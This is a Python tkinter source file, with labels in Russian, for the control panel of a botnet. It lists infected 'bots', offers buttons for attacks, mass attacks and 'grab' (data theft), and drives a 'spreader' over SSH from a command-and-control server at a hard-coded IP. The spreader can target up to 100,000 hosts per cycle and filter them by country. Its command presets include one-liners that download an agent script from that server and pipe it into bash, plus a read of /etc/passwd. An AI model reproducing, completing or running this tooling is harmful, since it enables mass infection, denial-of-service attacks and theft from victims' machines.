import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
import threading, socket, json, time, subprocess, os, re, requests
from gui.widgets import RightClickMenu

COMMAND_PRESETS = {
    "wget -O- http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (wget)",
    "curl -s http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (curl)",
    "cat /etc/passwd": "Получить список пользователей",
    "whoami": "Текущий пользователь",
    "uname -a": "Информация о системе",
    "df -h": "Свободное место на дисках"
}

class BotnetTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.vps_pass = None
        self.bots = {}
        self._last_fetch_error = 0
        self.sort_col = None
        self.sort_asc = True
        self.spreader_thread = None
        self.stop_requested = False
        self.create_widgets()
        self.after(5000, self._auto_refresh)

    def create_widgets(self):
        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True)

        # Вкладка Боты
        bot_frame = ttk.Frame(notebook)
        notebook.add(bot_frame, text="Боты")

        ctrl = ttk.Frame(bot_frame)
        ctrl.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Проверить всех", command=self.check_all_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
        ttk.Label(ctrl, text="Фильтр:").pack(side=tk.LEFT, padx=(20,5))
        self.filter_var = tk.StringVar(value="Все")
        self.filter_combo = ttk.Combobox(ctrl, textvariable=self.filter_var, values=["Все", "Online", "Offline"], width=10, state='readonly')
        self.filter_combo.pack(side=tk.LEFT)
        self.filter_combo.bind('<<ComboboxSelected>>', lambda e: self.refresh_bots())

        columns = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen", "open_ports")
        tree_frame = ttk.Frame(bot_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize(), command=lambda c=col: self.sort_by_column(c))
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.tree.tag_configure('online', foreground='#007700')
        self.tree.tag_configure('offline', foreground='#cc0000')

        self.context_menu = tk.Menu(self.tree, tearoff=0)
        self.context_menu.add_command(label="Атака", command=self._ctx_attack)
        self.context_menu.add_command(label="Граб", command=self._ctx_grab)
        self.context_menu.add_command(label="Стоп", command=self._ctx_stop)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Выполнить команду...", command=self._ctx_exec)
        self.context_menu.add_command(label="Копировать IP", command=self._ctx_copy_ip)
        self.tree.bind("<Button-3>", self._on_right_click)

        stat = ttk.Frame(bot_frame)
        stat.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = ttk.Label(stat, text="Всего: 0")
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = ttk.Label(stat, text="Онлайн: 0")
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # Вкладка Спредер
        spread_frame = ttk.Frame(notebook)
        notebook.add(spread_frame, text="Спредер")
        ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)

        f = ttk.Frame(spread_frame)
        f.pack(pady=5)
        ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
        self.scale_var = tk.IntVar(value=10000)
        self.spin_count = ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8)
        self.spin_count.pack(side=tk.LEFT, padx=5)

        ttk.Label(f, text="Страна:").pack(side=tk.LEFT, padx=(10,0))
        self.country_var = tk.StringVar(value="")
        self.country_combo = ttk.Combobox(f, textvariable=self.country_var, values=["", "RU", "CN", "US", "DE", "GB", "FR", "JP", "IN", "BR"], width=4, state='readonly')
        self.country_combo.pack(side=tk.LEFT, padx=5)

        self.local_var = tk.BooleanVar()
        ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
        self.btn_start_vps = ttk.Button(f, text="Запустить на VPS", command=self.start_spreader_vps)
        self.btn_start_vps.pack(side=tk.LEFT, padx=10)
        self.btn_stop_vps = ttk.Button(f, text="Стоп", command=self.stop_spreader_vps, state=tk.DISABLED)
        self.btn_stop_vps.pack(side=tk.LEFT, padx=10)
        self.btn_check_c2 = ttk.Button(f, text="Проверить C2", command=self.check_c2_connection)
        self.btn_check_c2.pack(side=tk.LEFT, padx=10)
        self.btn_update_vps = ttk.Button(f, text="Обновить VPS", command=self.update_vps)
        self.btn_update_vps.pack(side=tk.LEFT, padx=10)
        self.btn_load_targets = ttk.Button(f, text="Загрузить цели", command=self.load_targets_file)
        self.btn_load_targets.pack(side=tk.LEFT, padx=10)
        self.btn_masscan = ttk.Button(f, text="Masscan (встр.)", command=self.start_builtin_masscan)
        self.btn_masscan.pack(side=tk.LEFT, padx=10)

        self.spread_progress_var = tk.DoubleVar()
        self.spread_progress = ttk.Progressbar(spread_frame, variable=self.spread_progress_var, maximum=100, mode='indeterminate')
        self.spread_progress.pack(fill=tk.X, padx=5, pady=2)
        self.lbl_spread_status = ttk.Label(spread_frame, text="Готов")
        self.lbl_spread_status.pack(anchor='w', padx=5)

        self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
        self.spread_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        RightClickMenu(self.spread_log,
                       get_text_func=lambda: self.spread_log.selection_get() if self.spread_log.tag_ranges(tk.SEL) else self.spread_log.get("1.0", tk.END).strip())

        cmd_frame = ttk.LabelFrame(self, text="Пользовательская команда")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(cmd_frame, text="Выберите команду или введите свою:").grid(row=0, column=0, sticky='w', padx=5, pady=2)

        self.cmd_var = tk.StringVar()
        self.cmd_combo = ttk.Combobox(cmd_frame, textvariable=self.cmd_var,
                                      values=list(COMMAND_PRESETS.keys()), width=50, state='readonly')
        self.cmd_combo.grid(row=1, column=0, padx=5, pady=2, sticky='ew')
        self.cmd_combo.bind('<<ComboboxSelected>>', self._on_cmd_select)

        self.cmd_desc_label = ttk.Label(cmd_frame, text="", foreground="#555555")
        self.cmd_desc_label.grid(row=2, column=0, padx=5, sticky='w')

        self.cmd_entry = ttk.Entry(cmd_frame, width=50)
        self.cmd_entry.grid(row=3, column=0, padx=5, pady=2, sticky='ew')

        ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).grid(row=1, column=1, padx=5)
        cmd_frame.columnconfigure(0, weight=1)

        if COMMAND_PRESETS:
            first_cmd = list(COMMAND_PRESETS.keys())[0]
            self.cmd_combo.set(first_cmd)
            self.cmd_desc_label.config(text=COMMAND_PRESETS[first_cmd])

    # ... (все старые методы: контекстное меню, проверка C2, обновление ботов, атака, граб, стоп, send_raw, update_tree_safe, sort_by_column, _on_cmd_select, launch_attack, launch_grab, stop_selected, send_custom_command, mass_attack, load_targets_file, start_builtin_masscan, update_vps)

    def _run_spreader_stream(self):
        """Читает лог файл /root/c2/spreader.log через SSH и обновляет GUI"""
        self.stop_requested = False
        self.btn_start_vps.config(state=tk.DISABLED)
        self.btn_stop_vps.config(state=tk.NORMAL)
        self.spread_log.insert(tk.END, "[*] Запуск спредера...\n")
        self.lbl_spread_status.config(text="Подключение к VPS...")
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=10)

            # Убиваем старый процесс спредера
            client.exec_command("pkill -9 -f 'spreader.py'")
            time.sleep(1)
            # Очищаем лог
            client.exec_command("> /root/c2/spreader.log")
            # Запускаем спредер в screen, перенаправляя вывод в лог файл
            count = self.scale_var.get()
            country = self.country_var.get()
            cmd = f"cd /root/c2 && nohup python3 -u botnet/spreader.py --count {count} >> spreader.log 2>&1 &"
            if country:
                cmd = f"export SPREAD_COUNTRY={country}; {cmd}"
            client.exec_command(cmd)

            # Потоковое чтение лога через tail -f
            stdin, stdout, stderr = client.exec_command("tail -f /root/c2/spreader.log")
            self.lbl_spread_status.config(text="Сканирование...")
            self.spread_progress.config(mode='indeterminate')
            self.spread_progress.start()

            for line in iter(stdout.readline, ""):
                if self.stop_requested:
                    client.exec_command("pkill -9 -f 'spreader.py'")
                    break
                self.spread_log.insert(tk.END, line)
                self.spread_log.see(tk.END)
                # Парсим прогресс
                match = re.search(r'\[PROGRESS\]\s+(\d+)/(\d+)', line)
                if match:
                    current = int(match.group(1))
                    total = int(match.group(2))
                    progress = (current / total) * 100
                    self.spread_progress.config(mode='determinate')
                    self.spread_progress_var.set(progress)
                    self.lbl_spread_status.config(text=f"Сканирование: {current}/{total}")
            client.close()
        except Exception as e:
            self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
        finally:
            self.spread_progress.stop()
            self.btn_start_vps.config(state=tk.NORMAL)
            self.btn_stop_vps.config(state=tk.DISABLED)
            self.lbl_spread_status.config(text="Остановлено" if self.stop_requested else "Готов")

    def start_spreader_vps(self):
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
            if not self.vps_pass:
                return
        # Запускаем чтение лога в отдельном потоке
        self.spreader_thread = threading.Thread(target=self._run_spreader_stream, daemon=True)
        self.spreader_thread.start()

    def stop_spreader_vps(self):
        self.stop_requested = True
        self.btn_stop_vps.config(state=tk.DISABLED)
        self.lbl_spread_status.config(text="Остановка...")
